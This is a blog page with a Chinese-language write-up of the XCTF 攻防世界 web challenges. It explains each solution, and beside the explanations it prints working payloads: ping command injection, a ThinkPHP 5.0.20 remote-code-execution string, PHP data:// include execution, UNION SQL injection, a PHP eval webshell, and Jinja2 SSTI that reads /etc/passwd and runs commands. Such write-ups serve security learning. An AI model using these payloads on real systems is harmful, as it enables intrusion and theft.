<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
  
  <title>攻防世界WEB | T1h2er3的一亩三分地</title>
  <meta name="description" content="这是一个菜鸡学习的地方" />
  <meta name="keywords" content="CTF,WEB,林俊杰" />
  
    <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/2.jpg">
  
  <meta http-equiv="x-dns-prefetch-control" content="on">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/googlefont.css" media="all">
<!--  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">-->
  <link rel="stylesheet" id="saukra_css-css" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/style.css" type="text/css" media="all">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/lib.min.css" media="all">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/font.css" media="all">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/insight.css" media="all">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/jquery.fancybox.min.css" media="all">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/zoom.css" media="all">
  <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/sharejs.css">
<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
" type="text/css" media="all"> -->
  <script>
  /*Initial Variables*/
  var mashiro_option = new Object();
  var mashiro_global = new Object();
  mashiro_option.NProgressON = true;
  /* 
   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
   */
  mashiro_option.email_domain = "";
  mashiro_option.email_name = "";
  mashiro_option.cookie_version_control = "";
  mashiro_option.qzone_autocomplete = false;
  mashiro_option.site_name = "T1h2er3";
  mashiro_option.author_name = "";
  mashiro_option.site_url = "https://ther.wang";
  mashiro_option.v_appId = "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz";
  mashiro_option.v_appKey = "mgOpfzbkHYqU92CV4IDlAUHQ";
  mashiro_option.mathjax = "0";
  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";

  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
  // mashiro_option.float_player_on = true;

  /*End of Initial Variables*/
  </script>
  <script type="text/javascript">
  var bg = "https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/27.jpg".split(",");
  var bgindex = Math.floor(Math.random()*bg.length);
  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
    alert('朋友，IE浏览器未适配哦~');
  }
  </script>
  <style type="text/css">
  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
  </style>
  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
  </style>
<meta name="generator" content="Hexo 4.2.1"></head>

<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
  <div class="scrollbar" id="bar">
  </div>
  <a href="#" class="cd-top faa-float animated"></a>
  <section id="main-container">
    <div class="headertop filter-dot">
  <div id="banner_wave_1"></div>
  <div id="banner_wave_2"></div>
  <figure id="centerbg" class="centerbg">
    <div class="focusinfo no-select">
      <div class="header-tou">
        <a href="https://ther.wang" target="_blank" rel="noopener">
          <img src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/26.jpg">
        </a>
      </div>
      <div class="header-info">
        <p>不要总在过去的回忆里缠绵，昨天的太阳，晒不干今天的衣裳</p>
        <div class="top-social_v2">
          <li id="bg-pre">
            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
          </li>
          
            
              
                <li>
                  <a href="http://github.com/t1h2er3" target="_blank" class="social-github" title="github">
                    <img src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/img/social/github.png">
                  </a>
                </li>
              
            
              
                <li>
                  <a href="" target="_blank" class="social-github" title="email">
                    <img src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/img/social/email.svg">
                  </a>
                </li>
              
            
          
          <li id="bg-next">
            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
          </li>
        </div>
      </div>
    </div>
  </figure>
  
  <div id="video-container" style="display: none;">
    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
    </video>
    <div id="video-btn" class="loadvideo videolive">
    </div>
    <div id="video-add">
    </div>
    <div class="video-stu" >
    </div>
  </div>
  
  <div class="headertop-down faa-float animated" onclick="headertop_down()">
    <span>
      <i class="fa fa-chevron-down" aria-hidden="true">
      </i>
    </span>
  </div>
</div>

    <div id="page" class="site wrapper">
      <header class="site-header no-select gizle sabit" role="banner">
 
  <div class="site-top">
    <div class="site-branding">
      <span class="site-title">
        <span class="logolink moe-mashiro">
          <a href="/">
            <span class="sakurasono">T1h2er3</span>
            <span class="shironeko"></span>
          </a>
        </span>
      </span>
    </div>
    <div class="searchbox search-form-submit">
      <i class="iconfont js-toggle-search iconsearch icon-search">
      </i>
    </div>
    <div id="show-nav" class="showNav mobile-fit">
      <div class="line line1">
      </div>
      <div class="line line2">
      </div>
      <div class="line line3">
      </div>
    </div>
    <div class="lower-cantiner">
      <div class="lower">
        <nav class="mobile-fit-control hide">
          <ul id="menu-new" class="menu">
            
              <li>
                <a href="/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
                    首页
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="javascript:;">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
                    文章分类
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/categories/%E6%8A%80%E6%9C%AF/">
                          <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
                          技术
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="/comment/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
                    兴趣
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/music/">
                          <i class="fa fa-meetup" aria-hidden="true"></i>
                          音乐
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
          </ul>
        </nav>
      </div>
    </div>
  </div>
</header>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">

      <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/sharejs.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/tocbot.css">
<div class="pattern-center-blank"></div>

  <div class="pattern-center single-center">
    <!-- 有配图默认渲染第一张 -->
    <div class="pattern-attachment-img">
        <img src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/44.jpg" class="lazyload" onerror="imgError(this,3)" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;">
      </div>
    <header class="pattern-header single-header">
      <h1 class="entry-title">
      攻防世界WEB</h1>
      <p class="entry-census">
        <span>
          <a href="https://ther.wang" target="_blank" rel="noopener">
            <img src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/26.jpg">
          </a>
        </span>
        <span>
          <a href="https://ther.wang" target="_blank" rel="noopener">T1h2er3</a>
        </span>
        <span class="bull">
        ·</span>
        2020-5-30
        
      
        ·<span id="readcount"></span>次阅读
      
      </p>
    </header>
  </div>

<div id="content" class="site-content">
  <div id="primary" class="content-area">
    <main id="main" class="site-main" role="main">
      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
        <div class="toc"></div>
        <!--<div class="toc-entry-content"> <!-- 套嵌目录使用（主要为了支援评论）-->
        
        <div class="entry-content">
          <h1 id="攻防世界WEB"><a href="#攻防世界WEB" class="headerlink" title="攻防世界WEB"></a>攻防世界WEB</h1><h2 id="新手区"><a href="#新手区" class="headerlink" title="新手区"></a>新手区</h2><h3 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h3><p>不能右键查看源码，但是可以F12</p>
<h3 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h3><p>robots.txt是一个纯文本文件，是爬虫抓取网站的时候要查看的第一个文件，一般位于网站的根目录下。robots.txt文件定义了爬虫在爬取该网站时存在的限制，哪些部分爬虫可以爬取，哪些不可以爬取（防君子不防小人）</p>
<p>所以直接访问/robots.txt，可以看到一个f1ag_1s_h3re.php,访问拿到flag</p>
<h3 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h3><p>一般的备份文件后缀.bak,.swp,<a href="http://www.zip等等" target="_blank" rel="noopener">www.zip等等</a></p>
<p>访问index.php.bak拿到flag</p>
<h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>Cookie里有一个cookie.php，访问后在请求头看见flag</p>
<h3 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h3><p>修改前端源码，把disable去掉就可以了</p>
<h3 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h3><p>弱密码,admin 123456登录</p>
<h3 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h3><pre><code class="php">&lt;?php
show_source(__FILE__);
include(&quot;config.php&quot;);
$a=@$_GET[&#39;a&#39;];
$b=@$_GET[&#39;b&#39;];
if($a==0 and $a){
    echo $flag1;
}
if(is_numeric($b)){
    exit();
}
if($b&gt;1234){
    echo $flag2;
}
?&gt;</code></pre>
<p>第一层a要为0，但是a=0的话，1 and 0 会使if语句不成立</p>
<p>使用==是弱比较，使用字符串的0，也就是’0’绕过</p>
<p>第二层，b要不是数字但又要大于1234</p>
<p>同样利用弱类型,1235%00可以判断为不是数字</p>
<p>payload: a=%270%27&amp;b=1235%00</p>
<h3 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h3><p>GET请求被拼接到url上是明文可见，长度也有限制，但比POST快</p>
<p>POST请求比GET安全</p>
<h3 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h3><p>伪造 X-Forwarded-For=127.0.0.1</p>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>一句话木马，蚁剑直接连</p>
<h3 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h3><p>ping命令可以执行系统命令</p>
<p>127.0.0.1&amp;ls</p>
<p>127.0.0.1&amp;find / -name flag*</p>
<p>127.0.0.1&amp; cat /home/flag.txtq</p>
<h3 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h3><pre><code class="javascript">
    function dechiffre(pass_enc){
        var pass = &quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;;
        var tab  = pass_enc.split(&#39;,&#39;);
                var tab2 = pass.split(&#39;,&#39;);var i,j,k,l=0,m,n,o,p = &quot;&quot;;i = 0;j = tab.length;
                        k = j + (l) + (n=0);
                        n = tab2.length;
                        for(i = (o=0); i &lt; (k = j = n); i++ ){o = tab[i-l];p += String.fromCharCode((o = tab2[i]));
                                if(i == 5)break;}
                        for(i = (o=0); i &lt; (k = j = n); i++ ){
                        o = tab[i-l];
                                if(i &gt; 5 &amp;&amp; i &lt; k-1)
                                        p += String.fromCharCode((o = tab2[i]));
                        }
        p += String.fromCharCode(tab2[17]);
        pass = p;return pass;
    }
    String[&quot;fromCharCode&quot;](dechiffre(&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;));

    h = window.prompt(&#39;Enter password&#39;);
    alert( dechiffre(h) );
</code></pre>
<p>将dechiffre里面的解码</p>
<p>解码得：55,56,54,79,115,69,114,116,107,49,50</p>
<p>将这串数字进行ASCII码转换得：786OsErtk12</p>
<p>提交Cyberpeace{786OsErtk12}得到正确答案。</p>
<h2 id="进阶区"><a href="#进阶区" class="headerlink" title="进阶区"></a>进阶区</h2><h3 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h3><p>题目描述：想想初始页面是哪个</p>
<p>看见题目描述，抓包访问index.php</p>
<p>找到FLAG: flag{very_baby_web}</p>
<h3 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h3><p>看见题目名字，就访问了robots.txt，看到了有/fl0g.php,访问拿flag</p>
<h3 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h3><p>进去是一个THINKPHP5的框架</p>
<p>想办法报错暴露版本</p>
<p>?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</p>
<p>看到版本为ThinkPHP V5.0.20</p>
<p>在网上找到payload</p>
<p>s=index/think\App/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</p>
<h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h3><pre><code class="php">&lt;?php
show_source(__FILE__);
echo $_GET[&#39;hello&#39;];
$page=$_GET[&#39;page&#39;];
while (strstr($page, &quot;php://&quot;)) {
    $page=str_replace(&quot;php://&quot;, &quot;&quot;, $page);
}
include($page);
?&gt;</code></pre>
<p>文件包含漏洞</p>
<p>利用data协议,执行命令</p>
<pre><code class="text">data://text/plain,&lt;?php phpindo();?&gt;
page=data://text/plain,&lt;?php%20system(%27cat%20./fl4gisisish3r3.php%27);?&gt;</code></pre>
<p>源码看到flag</p>
<h3 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h3><p>这道题是我万万没想到的，纯脑洞题</p>
<pre><code>http://220.249.52.133:37433/index.php?id=1</code></pre><p>看着这个url贼像注入，结果不是</p>
<p>直接爆破这个id，1-10000拿到flag</p>
<p>flag在id=2333的地方</p>
<h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>BUU做过</p>
<p>payload:/source.php?file=hint.php?../../../../../ffffllllaaaagggg</p>
<h3 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h3><p>search处存在sql注入</p>
<p>2’ union select 1,2,3#</p>
<p>什么都没过滤，常规</p>
<pre><code class="mysql">1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3#

1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;secret_table&#39;),3#

1&#39; union select 1,(select group_concat(fl4g) from secret_table),3#</code></pre>
<h3 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h3><p>php有源文件phps(学到了)</p>
<pre><code class="php">&lt;?php
if(&quot;admin&quot;===$_GET[id]) {
  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == &quot;admin&quot;)
{
  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;
  echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;;
}
?&gt;</code></pre>
<p>可以将id进行url编码后传入，但是要注意，url在传入的时候会自动进行一次编码，所以我们要将admin编码两次后传入</p>
<h3 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h3><pre><code class="php">class xctf{
public $flag = &#39;111&#39;;
public function __wakeup(){
exit(&#39;bad requests&#39;);
}</code></pre>
<p>不太懂这道题，就是考一个序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行</p>
<pre><code class="php">&lt;?php
class xctf
{
    public $flag = &#39;111&#39;;
}
$a=new xctf();
echo urlencode(serialize($a));

# O%3A4%3A%22xctf%22%3A1%3A%7Bs%3A4%3A%22flag%22%3Bs%3A3%3A%22111%22%3B%7D
将1改成2
payload:O%3A4%3A%22xctf%22%3A2%3A%7Bs%3A4%3A%22flag%22%3Bs%3A3%3A%22111%22%3B%7D</code></pre>
<h3 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h3><p>上传了一个.jpg的文件,内容是</p>
<pre><code class="text">GIF89a? 
&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</code></pre>
<p>抓包上传的时候，更改后缀为php</p>
<p>上传成功，蚁剑连接拿到flag</p>
<h3 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h3><p>python 模板注入</p>
<p>尝试了一下49返回了有49</p>
<pre><code class="text">{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}} 可以执行

执行任意命令:
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}</code></pre>
<p>也可以直接tplmap –os-shell拿shell</p>
<h3 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h3><pre><code class="php">&lt;?php 
class Demo { 
    private $file = &#39;index.php&#39;;
    public function __construct($file) { 
        $this-&gt;file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this-&gt;file, true); 
    }
    function __wakeup() { 
        if ($this-&gt;file != &#39;index.php&#39;) { 
            //the secret is in the fl4g.php
            $this-&gt;file = &#39;index.php&#39;; 
        } 
    } 
}
if (isset($_GET[&#39;var&#39;])) { 
    $var = base64_decode($_GET[&#39;var&#39;]); 
    if (preg_match(&#39;[oc]:\d+:/i&#39;, $var)) { 
        die(&#39;stop hacking!&#39;); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file(&quot;index.php&quot;); 
} 
?&gt;</code></pre>
<p>首先要绕过正则：/i是忽略大小写</p>
<p><img src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/20200604003149.png" alt=""></p>
<p>所以要把O:4改成O:+4</p>
<p>再把成员数改大，就可以绕过了</p>
<pre><code class="php">&lt;?php
class Demo {
    private $file = &#39;fl4g.php&#39;;
}


$a=new Demo();
#echo serialize($a);
$str=&#39;O:+4:&quot;Demo&quot;:2:{s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;}&#39;;
echo base64_encode($str);

?&gt;</code></pre>
<h3 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h3><pre><code class="python">import flask
import os

app = flask.Flask(__name__)

app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)

@app.route(&#39;/&#39;)
def index():
    return open(__file__).read()

@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)
        blacklist = [&#39;config&#39;, &#39;self&#39;]
        return &#39;&#39;.join([&#39;{{% set {}=None%}}&#39;.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))

if __name__ == &#39;__main__&#39;:
    app.run(debug=True)</code></pre>
<p>访问 /shrine/ 是 404，访问 /shrine/49 可以发现存在 SSTI 漏洞，在代码中        过滤了 (, ), config, self ，并且说明了 flag 在 config 中</p>
<p>这里的黑名单就锁死了 <strong>subclasses</strong>() 以及 config 和 self.<strong>dict</strong></p>
<p>在 flask 的官方文档中写了一个 url_for 函数，在它引用的内容中，有着current_app的全局变量，然后就可以直接读取 flag 了      </p>
<p>url_for.<strong>globals</strong>[‘current_app’].config[‘FLAG’]</p>
<h3 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h3><p>在about页面有个Git，想到git泄露，用githack试了下</p>
<p>有几个php文件</p>
<p>首先是index.php</p>
<pre><code class="php">&lt;?php
if (isset($_GET[&#39;page&#39;])) {
    $page = $_GET[&#39;page&#39;];
} else {
    $page = &quot;home&quot;;
}
$file = &quot;templates/&quot; . $page . &quot;.php&quot;;
// I heard &#39;..&#39; is dangerous!
assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);
// TODO: Make this look nice
assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);
?&gt;</code></pre>
<p>有个flag.php,要想办法读到flag.php</p>
<p>assert函数是可以执行系统命令的，得想办法闭合assert</p>
<pre><code class="php">assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) === false&quot;)
    填写file 123&#39;) or system(&#39;ls&#39;);//
assert(&quot;strpos(&#39;123&#39;) or system(&#39;ls&#39;);// &#39;, &#39;..&#39;) === false&quot;)</code></pre>
<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><pre><code class="php">&lt;?php
$miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;

function encode($str){
    $_o=strrev($str);
    // echo $_o;

    for($_0=0;$_0&lt;strlen($_o);$_0++){

        $_c=substr($_o,$_0,1);
        $__=ord($_c)+1;
        $_c=chr($__);
        $_=$_.$_c;   
    } 
    return str_rot13(strrev(base64_encode($_)));
}

highlight_file(__FILE__);
/*
   逆向加密算法，解密$miwen就是flag
*/
?&gt;</code></pre>
<p>加密的关键步骤就是讲明文每一位都让ascii码加1</p>
<p>解密脚本</p>
<pre><code class="php">&lt;?php
$a=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;
$a=str_rot13($a);
$a=strrev($a);
$a=base64_decode($a);

function decode($str){
    $b=&quot;&quot;;
    for($i=0;$i&lt;strlen($str);$i++){
        $b=$b.(chr(ord($str[$i])-1));
    }
    return $b;
}

echo strrev(decode($a));
?&gt;</code></pre>

        </div>
        <!-- .entry-content -->
        
        <div class="single-reward">
          <div class="reward-open">赏
            <div class="reward-main">
              <ul class="reward-row">
                <li class="alipay-code"><img src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/zfbqr.png"></li>
                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/wechatqr.png"></li>
              </ul>
            </div>
          </div>
        </div>
          
        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
        <footer class="post-footer">
          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
          <div class="post-tags">
          </div>
          <div class="post-share">
            <div class="social-share sharehidden share-component"></div>
            <i class="iconfont show-share icon-forward"></i>
          </div>
        </footer><!-- .entry-footer -->
      </article>
      <!-- #post-## -->
      <div class="toc" style="background: none;"></div>
      <section class="post-squares nextprev">
        
          
            <div class="post-nepre half previous">
          
            <a href="/2020/06/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98/" rel="prev">
              <div class="background">
<!--                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/45.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/45.jpg">-->
                
                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/45.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
              </div>
              <span class="label">
              Previous Post</span>
              <div class="info">
                <h3>
                渗透测试面试问题</h3>
                <hr>
              </div>
            </a>
          </div>
        
        
          
            <div class="post-nepre half next">
          
            <a href="/2020/05/29/GKCTF2020/" rel="next">
              <div class="background">
                
                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/42.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
              </div>
              <span class="label">
              Next Post</span>
              <div class="info">
                <h3>
                GKCTF2020</h3>
                <hr>
              </div>
            </a>
          </div>
        
      </section>
      
<div id="vcomments"></div>
<script>
  window.onload = function(){
      var valine = new Valine();
      valine.init({
        el: '#vcomments',
        appId: "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz",
        appKey: "mgOpfzbkHYqU92CV4IDlAUHQ",
        path: window.location.pathname,
        placeholder: "你是我一生只会遇见一次的惊喜 ..."
      })
  }
</script>

      <section class="author-profile">
        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
          <a href="https://ther.wang" target="_blank" rel="noopener" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/26.jpg" itemprop="image" alt="T1h2er3" height="70" width="70"></a>
          <div class="meta">
            <span class="title">Author</span>
            <h3 itemprop="name">
            <a href="https://ther.wang" target="_blank" itemprop="url" rel="author noopener">T1h2er3</a>
            </h3>
          </div>
        </div>
        <hr>
        <p><i class="iconfont icon-write"></i></p>
      </section>
    </main><!-- #main -->
  </div><!-- #primary -->
</div>


    </div>    
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: '文章',
            // PAGES: '页面',
            CATEGORIES: '分类',
            TAGS: '标签',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
    <!-- <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 T1h2er3<br>
      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer> -->
<footer id="colophon" class="site-footer" role="contentinfo">
    <div class="site-info">
        <div class="footertext">
            <div class="img-preload">
                <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
                <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
            </div>
            
                <p id="chakhsu"></p>
            
            <p>本站总访问量：<a id="allcount"></a></p>
            <p style="color: #666666;">到底啦！</p>
            
                <p id="momk" style="font-family: 'Ubuntu', sans-serif;color: #b9b9b9;"></p>
            
        </div>
        <div class="footer-device">
            <p style="font-family: 'Ubuntu', sans-serif;">
 <span style="">Theme <a href="https://github.com/xbclub/Hexo-theme-sakura" target="_blank"
                         style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i
             class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a
             href="https://2heng.xin/" target="_blank"
             style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a
             href="https://www.hojun.cn/" target="_blank"
             style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>&<a
             href="https://42cloud.cn/" target="_blank"
             style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">42team, Powered by Hexo</a>
        </span>
            </p>
        </div>
